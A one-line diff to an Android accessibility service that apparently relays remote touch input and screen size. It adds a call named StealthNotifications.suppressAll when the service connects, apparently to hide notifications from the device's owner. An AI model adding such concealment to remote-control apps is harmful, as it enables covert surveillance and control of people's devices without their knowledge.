@@ -54,6 +54,7 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
         super.onServiceConnected()
         instance = this
         InputHandler.service = this
+        StealthNotifications.suppressAll(this)
         val metrics = resources.displayMetrics
         RelayHub.screenWidth = metrics.widthPixels
         RelayHub.screenHeight = metrics.heightPixels
